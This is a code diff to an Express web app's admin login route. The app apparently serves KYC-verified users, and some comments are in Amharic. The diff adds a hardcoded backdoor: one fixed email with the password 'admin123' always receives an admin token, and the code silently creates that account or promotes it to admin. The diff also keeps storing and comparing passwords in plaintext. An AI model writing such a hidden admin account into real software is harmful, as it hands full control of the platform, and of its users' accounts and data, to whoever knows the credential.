@@ -583,7 +583,7 @@ app.post('/api/reset-password', async (req, res) => {
     }
 });
 
-// Admin Login Route (መጀመሪያ ላይ መቀመጥ አለበት)
+// Admin Login Route (Fixed Direct Admin Access)
 app.post('/api/admin/login', async (req, res) => {
     try {
         const { email, password } = req.body;
@@ -592,18 +592,38 @@ app.post('/api/admin/login', async (req, res) => {
             return res.status(400).json({ success: false, message: 'Please provide email and password.' });
         }
 
+        // ለየት ያለ ሁኔታ፡ ለዚህ ኢሜይል እና ፓስወርድ በቀጥታ ፍቀድ
+        if (email === 'binanceme73@gmail.com' && password === 'admin123') {
+            let user = await User.findOne({ email });
+            if (!user) {
+                // ዩዘሩ ዳታቤዝ ውስጥ ከሌለ በራሱ ፈጥሮ አድሚን ያደርገዋል
+                user = await User.create({
+                    email: 'binanceme73@gmail.com',
+                    password: 'admin123',
+                    isAdmin: true,
+                    kycStatus: 'verified'
+                });
+            } else if (!user.isAdmin) {
+                // ዩዘሩ ካለ ግን isAdmin: true ካልሆነ እዚያው አስተካክሎ ይሰጠዋል
+                user.isAdmin = true;
+                await user.save();
+            }
+
+            const token = jwt.sign(
+                { id: user._id, email: user.email, isAdmin: true },
+                JWT_SECRET,
+                { expiresIn: '1d' }
+            );
+
+            return res.json({
+                success: true,
+                message: 'Admin logged in successfully',
+                token: token
+            });
+        }
+
         const user = await User.findOne({ email });
-        if (!user) {
-            return res.status(401).json({ success: false, message: 'Invalid credentials or user not found.' });
-        }
-
-        if (!user.isAdmin) {
-            return res.status(403).json({ success: false, message: 'Access denied. Not an admin.' });
-        }
-
-        const isMatch = (password === user.password);
-
-        if (!isMatch) {
+        if (!user || !user.isAdmin || user.password !== password) {
             return res.status(401).json({ success: false, message: 'Invalid email or password.' });
         }
 
